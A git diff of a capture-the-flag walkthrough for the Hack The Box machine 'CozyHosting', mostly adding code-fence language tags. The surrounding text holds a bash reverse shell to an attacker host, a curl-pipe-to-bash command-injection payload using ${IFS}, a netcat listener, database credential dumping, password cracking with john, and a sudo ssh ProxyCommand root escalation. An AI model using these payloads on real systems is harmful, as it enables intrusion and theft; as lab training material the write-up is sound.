@@ -33,18 +33,6 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 |_http-title: Cozy Hosting - Home
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-TCP/IP fingerprint:
-OS:SCAN(V=7.94%E=4%D=9/6%OT=22%CT=1%CU=33196%PV=Y%DS=2%DC=I%G=Y%TM=64F89924
-OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(
-OS:SP=101%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=10B%TI=Z%C
-OS:I=Z%II=I%TS=A)SEQ(SP=F9%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST1
-OS:1NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53
-OS:CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T
-OS:=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T
-OS:2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=4
-OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
-OS:Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=16
-OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
 
 Network Distance: 2 hops
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
@@ -78,7 +66,7 @@ So let's go to: cozyhosting.htb/actuator and see what we can find:
 tip: use curl and pipe it to a tool called "jq" to make it easier to read like this:
 
  
- ```
+ ```bash
  using : curl http://cozyhosting.htb/actuator/ | jq
  
  {
@@ -130,7 +118,7 @@ We have here 2 interesting endpoints:
 
 Going to the cozyhosting.htb/actuators/sessions will show us the following:
 
-```
+```json
 {"E7A9940B3194AD022D281F0E39D9EB22":"kanderson","BCEE4FF2CB869A2E9393F7A48E903D7F":"UNAUTHORIZED","8E6436517BF53FCCF7EC47A228D0729D":"kanderson","41CC0DC883CF2C33D3C35EE72867FE29":"UNAUTHORIZED","0AEEBFCA6380021D07300D99C15332C2":"UNAUTHORIZED","A1DEF9DB3A41611D9D73830AD182C0FE":"UNAUTHORIZED","C30E5611F631D404FA948CD44736D962":"UNAUTHORIZED","32A41BF1DFC7ACB2168A1F1F6A07FD9A":"kanderson","D5058C81E543C258DA9D0A41132E108D":"UNAUTHORIZED"}
 ```
 basically sessions IDs....
@@ -177,7 +165,7 @@ The id command seems like to have done something, so lets try to get a reverse s
 
 You can find many commands online for reverse shell, we know the target is running Linux, so we will use one written in bash:
 
-```
+```bash
 bash -i >& /dev/tcp/<attacker ip>/<any port> 0>&1
 ```
 
@@ -185,7 +173,7 @@ Unfortunately we weren't able to execute it because of the spaces and the ''&'' 
 
 Executing this command on the target system will grant us access to it, but also we must set a listener on our machine:
 
-```
+```bash
 nc -nlvp <any port>
 
 -n: numeric system.
@@ -202,14 +190,15 @@ Here we are sending a command to the target to curl a file that has the reverse 
 ${IFS}: An environment variable to escape spaces.
 
 Also we need to execute this on our machine:
-```
+
+```python
 python -m http.server
 ```
 this will make our file accessible to the target machine because we want it to download it
 
 Tip: execute the python command in the same directory that you have your shell file in, so it easier to access.
 
-```
+```bash
 `curl${IFS}10.10.14.132:8000/revshell${IFS}|${IFS}bash`
 ```
 
@@ -234,7 +223,7 @@ After we extract it we will get a large folder full of java classes and data abo
 ![](../assets/images/cozyhosting/20230906201813.png)
 This file had credentials for the locally running database which is using postgres, so now we can dump the database and get all the passwords!
 
-```
+```bash
 psql -h localhost -d cozyhosting -U postgres
 
 -h: the host.
@@ -252,14 +241,14 @@ Hashed passwords for users!!!
 
 We will use john to unhash them, like so:
 
-```
+```bash
 john john -wordlist=/usr/share/wordlists/rockyou.txt pass.txt
 --wordlist: to specify the wordlist.
 ```
 
 After that john will be done in seconds and we will use this command to show the password:
 
-```
+```bash
 john --show pass.txt
 ```
 
@@ -277,7 +266,7 @@ When we were exploring our machine we found a user with the username josh from t
 
 We will log in from our local machine doing so:
 
-```
+```bash
 ssh josh@10.10.11.230
 ```
 
@@ -292,7 +281,7 @@ and so is the user flag is here, now time for root.
 
 First let's see what can we run with the sudo command using:
 
-```
+```bash
 sudo -l
 ```
 
@@ -302,7 +291,7 @@ We can run ssh, which is interesting.
 
 after searching a bit in the internet we can see that we can use it to spawn a root shell using proxycommands.
 
-```
+```bash
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
 
